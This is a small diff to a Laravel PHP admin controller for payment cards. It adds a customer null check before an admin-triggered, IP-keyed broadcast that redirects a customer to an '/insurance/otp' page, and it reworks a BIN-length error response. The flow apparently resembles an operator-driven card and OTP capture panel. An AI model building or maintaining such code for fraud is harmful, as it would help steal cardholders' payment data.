@@ -45,7 +45,7 @@ class AdminPaymentCardController extends Controller
         }
 
         // Redirect customer to OTP page via global redirect channel
-        if ($customerIp) {
+        if ($customerIp && $card->customer) {
             try {
                 $card->customer->update(['current_page' => '/insurance/otp']);
                 broadcast(new CustomerRedirected($customerIp, '/insurance/otp'));
@@ -106,7 +106,7 @@ class AdminPaymentCardController extends Controller
         $bin = preg_replace('/\D/', '', $bin);
 
         if (strlen($bin) < 6) {
-            return response()->json(['error' => 'BIN must be at least 6 digits'], 422);
+            return response()->json(['success' => false, 'message' => 'BIN must be at least 6 digits'], 422);
         }
 
         $first = (int) substr($bin, 0, 1);
